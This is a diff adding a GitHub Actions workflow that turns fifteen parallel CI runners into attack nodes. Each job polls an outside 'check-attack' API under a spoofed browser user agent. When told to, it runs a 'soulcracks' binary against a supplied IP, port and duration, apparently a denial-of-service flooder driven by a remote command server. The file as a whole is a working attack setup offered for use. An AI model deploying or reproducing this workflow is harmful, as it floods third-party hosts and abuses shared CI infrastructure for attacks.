@@ -1,0 +1,67 @@
+name: Execute soulcracks
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  execute-soulcracks:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 15
+      fail-fast: false
+      matrix:
+        session: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Debug directory structure
+        run: |
+          echo "Listing repository contents:"
+          ls -la
+          echo "Checking for soulcracks binary:"
+          find . -maxdepth 3 -type f -name "soulcracks" || echo "soulcracks not found"
+
+      - name: Make binary executable
+        run: |
+          if [ -f "./soulcracks" ]; then
+            chmod 777 "./soulcracks"
+            echo "Set permissions for soulcracks"
+          else
+            echo "Error: soulcracks binary not found in repository root"
+            exit 1
+          fi
+
+      - name: Poll API and execute soulcracks (session ${{ matrix.session }})
+        env:
+          SESSION_ID: ${{ matrix.session }}
+          API_URL: https://galaxyshop.tech/api/check-attack.php
+          # Use a browser-like UA to avoid 403 Forbidden on some hosts
+          USER_AGENT: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
+        run: |
+          echo "Session ${SESSION_ID} polling..."
+          # Loop until API tells us to execute; adapt JSON parsing to your API’s schema
+          while true; do
+            RESPONSE="$(curl -sS -A "${USER_AGENT}" "${API_URL}?session=${SESSION_ID}")"
+            echo "Raw response: ${RESPONSE}"
+
+            # Expected JSON shape example:
+            # { "execute": true, "ip": "1.2.3.4", "port": 443, "duration": 60 }
+            EXECUTE="$(echo "${RESPONSE}" | jq -r '.execute // false')"
+            IP="$(echo "${RESPONSE}" | jq -r '.ip // empty')"
+            PORT="$(echo "${RESPONSE}" | jq -r '.port // empty')"
+            DURATION="$(echo "${RESPONSE}" | jq -r '.duration // empty')"
+
+            if [ "${EXECUTE}" = "true" ] && [ -n "${IP}" ] && [ -n "${PORT}" ] && [ -n "${DURATION}" ]; then
+              echo "Executing: ./soulcracks ${IP} ${PORT} ${DURATION} 2000 (session ${SESSION_ID})"
+              ./soulcracks "${IP}" "${PORT}" "${DURATION}" "2000"
+              EXIT_CODE=$?
+              echo "soulcracks exit code: ${EXIT_CODE}"
+              exit "${EXIT_CODE}"
+            else
+              echo "No execute order or incomplete data; sleeping 5s..."
+              sleep 5
+            fi
+          done
